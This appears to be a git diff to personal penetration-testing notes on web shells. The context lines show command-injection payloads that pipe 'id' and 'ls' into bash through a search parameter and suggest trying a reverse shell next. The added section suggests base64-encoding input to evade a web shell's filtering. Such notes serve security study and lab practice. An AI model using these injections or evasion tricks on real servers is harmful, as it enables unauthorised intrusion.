@@ -58,3 +58,11 @@ http://IP_HOST/echo.php?search=id+|+bash
 echo.php?search=ls+|+bash
 # Then try to input a reverse shell
 ```
+
+## Web filtering
+
+If a web shell filters your input, try to encode it into `base64`
+
+![](Pasted%20image%2020240417160455.png)
+
+- If it doesn't work, try some [Command Injection 💄](command_injection.md)
